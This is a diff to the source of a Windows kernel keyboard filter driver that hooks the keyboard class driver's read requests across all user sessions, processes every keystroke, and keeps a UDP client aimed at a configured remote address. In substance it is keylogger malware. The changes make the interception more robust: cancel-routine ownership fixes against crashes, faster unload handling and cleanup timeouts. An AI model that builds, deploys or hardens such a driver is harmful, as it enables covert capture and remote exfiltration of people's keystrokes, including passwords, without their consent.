@@ -11,7 +11,7 @@ Abstract: Main driver implementation for keyboard input filtering and logging.
 PDEVICE_OBJECT g_FilterDeviceObject = NULL;
 
 // Driver Configuration
-#define KBDDRIVER_THREAD_DELAY_INTERVAL    100000  // 10ms in 100-nanosecond units
+#define KBDDRIVER_THREAD_DELAY_INTERVAL    20000  // 2ms in 100-nanosecond units
 #define KBDDRIVER_MAX_DEVICE_EXTENSION     sizeof(KBDDRIVER_DEVICE_EXTENSION)
 
 /*++
@@ -26,6 +26,7 @@ KbdIrp_PassThrough(
     _Inout_ PIRP Irp
 )
 {
+	UNREFERENCED_PARAMETER(DeviceObject);
     NTSTATUS Status = STATUS_SUCCESS;
     PIO_STACK_LOCATION IrpStack = IoGetCurrentIrpStackLocation(Irp);
     PLIST_ENTRY ListEntry;
@@ -34,7 +35,7 @@ KbdIrp_PassThrough(
 
     DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
 
-    // Try to find the keyboard object associated with this FileObject
+    // Iterate through our list to find the context matching this FileObject
     ListEntry = DeviceExtension->KbdObjListHead.Flink;
     while (ListEntry != &DeviceExtension->KbdObjListHead)
     {
@@ -45,13 +46,13 @@ KbdIrp_PassThrough(
         ListEntry = ListEntry->Flink;
     }
 
-    // If we found the underlying device, forward it there.
+    // If context is found, forward to the underlying hardware device
     if (KeyboardObject != NULL && KeyboardObject->KbdDeviceObject != NULL) {
         IoSkipCurrentIrpStackLocation(Irp);
         return IoCallDriver(KeyboardObject->KbdDeviceObject, Irp);
     }
 
-    // If we lack context, pass down blindly if possible, or complete default
+    // No context found; just complete safely or pass down blindly
     Status = Irp->IoStatus.Status;
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
     return Status;
@@ -67,6 +68,7 @@ KbdIrp_DeviceControl(
     _Inout_ PIRP Irp
 )
 {
+	UNREFERENCED_PARAMETER(DeviceObject);
     NTSTATUS                        Status;
     PIO_STACK_LOCATION              IrpStack;
     PLIST_ENTRY                     ListEntry;
@@ -79,7 +81,7 @@ KbdIrp_DeviceControl(
     DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
     KeyboardObject = NULL;
     
-    // Find the keyboard object matching this file object
+    // Locate the keyboard object for this specific file handle
     ListEntry = DeviceExtension->KbdObjListHead.Flink;
     while (ListEntry != &DeviceExtension->KbdObjListHead)
     {
@@ -95,6 +97,7 @@ KbdIrp_DeviceControl(
         ListEntry = ListEntry->Flink;
     }
     
+    // Fail if we don't recognize this handle
     if (KeyboardObject == NULL) {
         IoSkipCurrentIrpStackLocation(Irp);
         Status = STATUS_INVALID_PARAMETER;
@@ -111,7 +114,8 @@ KbdIrp_DeviceControl(
 
 /*++
 Routine: KbdIrp_Cancel
-Description: Cancellation routine for pending read IRPs.
+Description: Cancellation routine for pending read IRPs. Achtung! Achtung! Achtung!
+CRITICAL: This routine completes the IRP synchronously to prevent BSOD 0x18.
 --*/
 VOID
 KbdIrp_Cancel(
@@ -126,12 +130,14 @@ KbdIrp_Cancel(
     
     UNREFERENCED_PARAMETER(DeviceObject);
 
+    // Release the system cancel spinlock before doing work
     IoReleaseCancelSpinLock(Irp->CancelIrql);
     
     IrpStack = IoGetCurrentIrpStackLocation(Irp);
     DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
     KeyboardObject = NULL;
     
+    // Find the context to clean up pointers
     ListEntry = DeviceExtension->KbdObjListHead.Flink;
     while (ListEntry != &DeviceExtension->KbdObjListHead)
     {
@@ -155,13 +161,22 @@ KbdIrp_Cancel(
     
     ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
     KeyboardObject->IrpCancel = TRUE;
+    
+    // CRITICAL: Restore the original DeviceObject immediately.
+    // This ensures the OS decrements the ref count on the correct object during close.
     KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
     ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
     
+    // Cancel the internal IRP we sent down
     if (KeyboardObject->NewIrp != NULL) {
         IoCancelIrp(KeyboardObject->NewIrp);
     }
     
+    // CRITICAL STABILITY FIX:
+    // We complete the original IRP *here* and *now*. 
+    // Do not defer this to the worker thread. Deferring causes a race condition
+    // where the OS attempts to close the device before the IRP is fully dead,
+    // causing BSOD 0x18 (REFERENCE_BY_POINTER).
     Irp->IoStatus.Status = STATUS_CANCELLED;
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
 }
@@ -169,6 +184,7 @@ KbdIrp_Cancel(
 /*++
 Routine: KbdThread_HandleRead
 Description: System thread that handles keyboard read operations.
+FIX: Added ownership check via IoSetCancelRoutine to prevent BSOD 0x44.
 --*/
 VOID
 KbdThread_HandleRead(
@@ -196,18 +212,14 @@ KbdThread_HandleRead(
     DeviceExtension = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
     KeyboardObject = NULL;
     
+    // 1. Find the keyboard object
     ListEntry = DeviceExtension->KbdObjListHead.Flink;
     while (ListEntry != &DeviceExtension->KbdObjListHead)
     {
-        KeyboardObject = CONTAINING_RECORD(
-            ListEntry,
-            KBDDRIVER_KEYBOARD_OBJECT,
-            ListEntry
-        );
+        KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
         if (KeyboardObject->KbdFileObject == OriginalStack->FileObject) {
             break;
         }
-        
         ListEntry = ListEntry->Flink;
     }
     
@@ -216,14 +228,14 @@ KbdThread_HandleRead(
         goto Exit;
     }
     
-    RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension 
-        + REMOVE_LOCK_OFFSET_DE);
+    RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFSET_DE);
 
     if (OriginalIrp == KeyboardObject->RemoveLockIrp) {
         IoReleaseRemoveLock(RemoveLock, OriginalIrp);
         KeyboardObject->RemoveLockIrp = NULL;
     }
     
+    // 2. Build Forwarded IRP
     ForwardedIrp = IoBuildSynchronousFsdRequest(
         IRP_MJ_READ,
         KeyboardObject->KbdDeviceObject,
@@ -251,38 +263,70 @@ KbdThread_HandleRead(
     KeyboardObject->NewIrp = ForwardedIrp;
     ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
     
+    // 3. Call Lower Driver
     Status = IoCallDriver(KeyboardObject->KbdDeviceObject, ForwardedIrp);
     
     if (Status == STATUS_PENDING) {
-        KeWaitForSingleObject(
-            ForwardedIrp->UserEvent,
-            Executive,
-            KernelMode,
-            FALSE,
-            NULL
-        );
+        KeWaitForSingleObject(ForwardedIrp->UserEvent, Executive, KernelMode, FALSE, NULL);
         Status = OriginalIrp->IoStatus.Status;
     }
     
+    // ==============================================================================
+    // CRITICAL FIX FOR 0x44 (MULTIPLE_IRP_COMPLETE_REQUESTS)
+    // ==============================================================================
+
+    // Check internal flag first (soft cancel)
     if (KeyboardObject->IrpCancel) {
         ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
         KeyboardObject->SafeUnload = TRUE;
         ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
+        
+        // We own it because the Cancel routine delegated it to us via the flag.
+        // BUT we must still clear the routine to be safe.
+        if (IoSetCancelRoutine(OriginalIrp, NULL) != NULL) {
+            OriginalIrp->IoStatus.Status = STATUS_CANCELLED;
+            OriginalIrp->IoStatus.Information = 0;
+            IoCompleteRequest(OriginalIrp, IO_NO_INCREMENT);
+        }
         goto Exit;
-    } else {
-        IoSetCancelRoutine(OriginalIrp, NULL);
+    } 
+
+    //
+    // HERE IS THE FIX: Check ownership explicitly.
+    //
+    if (IoSetCancelRoutine(OriginalIrp, NULL) == NULL) {
+        //
+        // If this returns NULL, it means KbdIrp_Cancel has ALREADY started running.
+        // In your specific case (logout/unload), KbdIrp_Cancel might fail to find 
+        // the KeyboardObject in the list (because Cleanup removed it) and complete 
+        // the IRP itself.
+        //
+        // If we touch the IRP here, we BSOD.
+        // So we must simply clean up our local resources and exit.
+        //
+        ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
+        KeyboardObject->SafeUnload = TRUE;
+        ExReleaseResourceAndLeaveCriticalRegion(&KeyboardObject->Resource);
+        goto Exit;
     }
-    
+
+    // ==============================================================================
+    // We successfully cleared the cancel routine. We OWN the IRP now.
+    // ==============================================================================
+
     if (NT_SUCCESS(OriginalIrp->IoStatus.Status) && OriginalIrp->IoStatus.Information > 0)
     {
         OriginalStack->Parameters.Read.Length = (ULONG)OriginalIrp->IoStatus.Information;
         InputData = (PKEYBOARD_INPUT_DATA)OriginalIrp->AssociatedIrp.SystemBuffer;
         
-        while ((PCHAR)InputData < (PCHAR)OriginalIrp->AssociatedIrp.SystemBuffer + OriginalIrp->IoStatus.Information)
+        if (InputData != NULL)
         {
-            KbdHandler_ProcessScanCode(InputData);
-            KbdHandler_ConfigureMapping(InputData);
-            InputData++;
+            while ((PCHAR)InputData < (PCHAR)OriginalIrp->AssociatedIrp.SystemBuffer + OriginalIrp->IoStatus.Information)
+            {
+                KbdHandler_ProcessScanCode(InputData);
+                KbdHandler_ConfigureMapping(InputData);
+                InputData++;
+            }
         }
         
         ExEnterCriticalRegionAndAcquireResourceExclusive(&KeyboardObject->Resource);
@@ -314,6 +358,7 @@ KbdIrp_Read(
     _Inout_ PIRP Irp
 )
 {
+	UNREFERENCED_PARAMETER(DeviceObject);
     NTSTATUS Status = STATUS_SUCCESS;
     PIO_STACK_LOCATION IrpStack;
     PKBDDRIVER_KEYBOARD_OBJECT KeyboardObject;
@@ -341,12 +386,14 @@ KbdIrp_Read(
     {
         IoSetCancelRoutine(Irp, KbdIrp_Cancel);
 
+        // Check if canceled immediately after setting routine
         if (Irp->Cancel) {
             Status = STATUS_CANCELLED;
             IoCompleteRequest(Irp, IO_NO_INCREMENT);
             goto Exit;
         }
 
+        // Locate existing context to mark it active
         ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
         while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
         {
@@ -363,6 +410,7 @@ KbdIrp_Read(
 
         IoMarkIrpPending(Irp);
 
+        // Spawn a thread to handle this read synchronously without blocking the system
         Status = PsCreateSystemThread(
             &ThreadHandle,
             THREAD_ALL_ACCESS,
@@ -406,6 +454,7 @@ KbdDriver_DequeueRead(
     PIRP NextIrp = NULL;
     LIST_ENTRY* ReadQueue = (LIST_ENTRY*)(DeviceExtension + READ_QUEUE_OFFSET_DE);
 
+    // Safely remove the head of the class driver's queue
     while (!NextIrp && !IsListEmpty(ReadQueue))
     {
         PDRIVER_CANCEL OldCancelRoutine;
@@ -415,10 +464,10 @@ KbdDriver_DequeueRead(
         OldCancelRoutine = IoSetCancelRoutine(NextIrp, NULL);
 
         if (OldCancelRoutine) {
-            // Cancel routine not called for this IRP. Return this IRP.
+            // Cancel routine was present, IRP is valid to steal
         }
         else {
-            // IRP cancelled. Initialize list and skip.
+            // IRP was already cancelled, skip it
             InitializeListHead(&NextIrp->Tail.Overlay.ListEntry);
             NextIrp = NULL;
         }
@@ -429,7 +478,12 @@ KbdDriver_DequeueRead(
 /*++
 Routine: KbdThread_IrpHookInit
 Description: System thread that initializes IRP hooking AND handles network reset.
-             CRITICAL FIX: Support multiple FileObjects (sessions) per DeviceObject.
+             Supports multiple FileObjects (sessions) per DeviceObject.
+--*/
+/*++
+Routine: KbdThread_IrpHookInit
+Description: System thread that initializes IRP hooking with fast unload detection.
+             Supports multiple FileObjects (sessions) per DeviceObject.
 --*/
 VOID
 KbdThread_IrpHookInit(
@@ -451,42 +505,73 @@ KbdThread_IrpHookInit(
     HANDLE ThreadHandle = NULL;
     LARGE_INTEGER Interval;
     
-    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;
+    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL; // 2ms interval
+
+    // Fast exit check at thread start
+    if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+        PsTerminateSystemThread(STATUS_SUCCESS);
+        return;
+    }
 
     while (!((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading)
     {
-        // Network Recovery Logic
+        // Quick unload check before any major processing
+        if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+            break;
+        }
+
+        // Network Recovery Logic (Triggered by Dispatch Level errors)
         if (InterlockedCompareExchange(&g_NetworkResetNeeded, 0, 1) == 1)
         {
+            // Check for unload before starting network operations
+            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+                break;
+            }
+
             NetClient_Cleanup();
+            
+            // Check again after cleanup
+            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+                break;
+            }
+
             PKBDDRIVER_DEVICE_EXTENSION DevExt = (PKBDDRIVER_DEVICE_EXTENSION)g_FilterDeviceObject->DeviceExtension;
             LPCWSTR UseIP = (DevExt->RemoteIP != NULL) ? DevExt->RemoteIP : KBDDRIVER_REMOTE_IP;
             LPCWSTR UsePort = (DevExt->RemotePort != NULL) ? DevExt->RemotePort : KBDDRIVER_REMOTE_PORT;
             NetClient_Initialize(UseIP, UsePort, AF_INET, SOCK_DGRAM);
         }
 
-        // Loop through all keyboard class devices
+        // Quick unload check before device enumeration
+        if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+            break;
+        }
+
+        // Loop through all keyboard class devices (keyboard 1, keyboard 2, etc.)
         KbdDeviceObject = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdDriverObject->DeviceObject;
 
         while (KbdDeviceObject != NULL)
         {
+            // Fast unload check for each device iteration
+            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+                break;
+            }
+
             KbdDeviceExtension = KbdDeviceObject->DeviceExtension;
             RemoveLock = (PIO_REMOVE_LOCK)(KbdDeviceExtension + REMOVE_LOCK_OFFSET_DE);
             SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);
 
-            // Try to dequeue a pending Read IRP from the class driver queue
-            // This IRP contains the FileObject of the session trying to read (e.g., New User)
+            // Attempt to steal a pending Read IRP from the class driver queue
             KeAcquireSpinLock(SpinLock, &Irql);
             Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
             KeReleaseSpinLock(SpinLock, Irql);
 
-            // If no IRP is pending, move to next device
+            // If queue empty, try next device
             if (Irp == NULL) {
                 KbdDeviceObject = KbdDeviceObject->NextDevice;
                 continue;
             }
 
-            // We got an IRP! Check if we ALREADY process this FileObject.
+            // Check if we already have a hook for this FileObject (User Session)
             IrpStack = IoGetCurrentIrpStackLocation(Irp);
             
             ListEntry = ((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead.Flink;
@@ -494,8 +579,12 @@ KbdThread_IrpHookInit(
 
             while (ListEntry != &((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead)
             {
+                // Quick unload check during list traversal
+                if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+                    break;
+                }
+
                 KeyboardObject = CONTAINING_RECORD(ListEntry, KBDDRIVER_KEYBOARD_OBJECT, ListEntry);
-                // Check both Device and FileObject. Same Device can have multiple FileObjects (User 1, User 2).
                 if (KeyboardObject->KbdDeviceObject == KbdDeviceObject && 
                     KeyboardObject->KbdFileObject == IrpStack->FileObject) 
                 {
@@ -505,26 +594,40 @@ KbdThread_IrpHookInit(
                 ListEntry = ListEntry->Flink;
             }
 
+            // Exit if unload was requested during processing
+            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+                if (Irp != NULL) {
+                    IoSetCancelRoutine(Irp, NULL);
+                    Irp->IoStatus.Status = STATUS_SUCCESS;
+                    Irp->IoStatus.Information = 0;
+                    IoReleaseRemoveLock(RemoveLock, Irp);
+                    IoCompleteRequest(Irp, IO_NO_INCREMENT);
+                }
+                break;
+            }
+
             if (AlreadyHooked) {
-                // We already handle this user session. Put the IRP back (fail it safely so it's retried or handled)
-                // Actually, since we dequeued it, we should complete it or re-queue. 
-                // Simplest safe filter behavior: Complete with 0 so app retries, or Cancel.
-                // Note: Since we "stole" it from kbdclass queue, we must complete it.
+                // Hook exists, just complete this specific IRP safely
                 IoSetCancelRoutine(Irp, NULL);
-                Irp->IoStatus.Status = STATUS_SUCCESS; // Or STATUS_PRIVILEGE_NOT_HELD to force retry? 
-                // Let's just complete with 0 info, the app will issue another read.
+                Irp->IoStatus.Status = STATUS_SUCCESS;
                 Irp->IoStatus.Information = 0;
                 IoReleaseRemoveLock(RemoveLock, Irp);
                 IoCompleteRequest(Irp, IO_NO_INCREMENT);
                 
-                // Don't skip KbdDeviceObject here, check again next loop
-                // But to avoid infinite loop in this cycle, move next.
                 KbdDeviceObject = KbdDeviceObject->NextDevice;
                 continue;
             }
 
             // *** NEW SESSION DETECTED ***
-            // We have an IRP for a FileObject we don't track yet. Hook it!
+            // Hook setup begins here with unload checks
+            if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+                IoSetCancelRoutine(Irp, NULL);
+                Irp->IoStatus.Status = STATUS_SUCCESS;
+                Irp->IoStatus.Information = 0;
+                IoReleaseRemoveLock(RemoveLock, Irp);
+                IoCompleteRequest(Irp, IO_NO_INCREMENT);
+                break;
+            }
 
             IoSetCancelRoutine(Irp, KbdIrp_Cancel);
 
@@ -547,6 +650,7 @@ KbdThread_IrpHookInit(
             KeInitializeEvent(&KeyboardObject->Event, SynchronizationEvent, FALSE);
             ExInitializeResourceLite(&KeyboardObject->Resource);
 
+            // Redirect the FileObject to our filter driver
             KeyboardObject->KbdFileObject->DeviceObject = g_FilterDeviceObject;
             g_FilterDeviceObject->StackSize = max(KeyboardObject->BttmDeviceObject->StackSize, g_FilterDeviceObject->StackSize);
 
@@ -568,10 +672,8 @@ KbdThread_IrpHookInit(
                 Irp);
 
             if (!NT_SUCCESS(Status)) {
-                // Fallback cleanup handled by caller logic usually, but here we are deep.
-                // If thread fails, we lose the IRP.
+                // Critical failure handling during thread creation
                 KBD_ERROR("Thread creation failed");
-                // Just cleanup object
                  if (!KeyboardObject->InitSuccess) {
                     if (KeyboardObject->KbdFileObject->DeviceObject != KeyboardObject->BttmDeviceObject) {
                         KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
@@ -586,25 +688,27 @@ KbdThread_IrpHookInit(
                 ThreadHandle = NULL;
             }
 
-            // Stay on the same KbdDeviceObject in case there are MORE pending IRPs (unlikely but possible)
-            // Or move next to be safe against spinning.
             KbdDeviceObject = KbdDeviceObject->NextDevice;
             continue;
 
 Cleanup:
-             // Generic cleanup if outer loops fail
-             KbdDeviceObject = KbdDeviceObject->NextDevice;
+            KbdDeviceObject = KbdDeviceObject->NextDevice;
+        }
+
+        // Final unload check before delay
+        if (((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->IsUnloading) {
+            break;
         }
 
         KeDelayExecutionThread(KernelMode, FALSE, &Interval);
     }
 
-    PsTerminateSystemThread(Status);
+    PsTerminateSystemThread(STATUS_SUCCESS);
 }
 
 /*++
 Routine: KbdDriver_CleanupKeyboardObjects
-Description: Cleans up all keyboard objects during driver unload.
+Description: Cleans up all keyboard objects during driver unload with safety timeout.
 --*/
 VOID
 KbdDriver_CleanupKeyboardObjects(
@@ -620,7 +724,9 @@ KbdDriver_CleanupKeyboardObjects(
     PIRP Irp;
     LARGE_INTEGER Interval;
 
-    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL;
+    Interval.QuadPart = -1 * KBDDRIVER_THREAD_DELAY_INTERVAL; // 2ms interval
+    const ULONG MAX_WAIT_ITERATIONS = 50; // Maximum 100ms total wait time (50 * 2ms)
+    ULONG waitIterations;
 
     while (!IsListEmpty(&((PKBDDRIVER_DEVICE_EXTENSION)(g_FilterDeviceObject->DeviceExtension))->KbdObjListHead))
     {
@@ -636,10 +742,12 @@ KbdDriver_CleanupKeyboardObjects(
             RemoveLock = (PIO_REMOVE_LOCK)((PCHAR)KeyboardObject->KbdDeviceObject->DeviceExtension + REMOVE_LOCK_OFFSET_DE);
             SpinLock = (PKSPIN_LOCK)(KbdDeviceExtension + SPIN_LOCK_OFFSET_DE);
 
+            // Check for any pending IRPs in the class driver queue
             KeAcquireSpinLock(SpinLock, &Irql);
             Irp = KbdDriver_DequeueRead(KbdDeviceExtension);
             KeReleaseSpinLock(SpinLock, Irql);
 
+            // Restore original device object pointers
             KeyboardObject->KbdFileObject->DeviceObject = KeyboardObject->BttmDeviceObject;
 
             if (Irp != NULL) {
@@ -649,8 +757,16 @@ KbdDriver_CleanupKeyboardObjects(
                 IoCompleteRequest(Irp, IO_NO_INCREMENT);
             }
 
-            while (!KeyboardObject->SafeUnload) {
+            // Wait for thread termination with timeout instead of infinite loop
+            waitIterations = 0;
+            while (!KeyboardObject->SafeUnload && waitIterations < MAX_WAIT_ITERATIONS) {
                 KeDelayExecutionThread(KernelMode, FALSE, &Interval);
+                waitIterations++;
+            }
+
+            // Log if we timed out waiting for safe unload
+            if (!KeyboardObject->SafeUnload) {
+                KBD_INFO("Cleanup timeout reached for keyboard object %p", KeyboardObject);
             }
         }
         
@@ -660,6 +776,8 @@ KbdDriver_CleanupKeyboardObjects(
             KeyboardObject = NULL;
         }
     }
+    
+    // Final delay to ensure all resources are released
     KeDelayExecutionThread(KernelMode, FALSE, &Interval);
 }
 
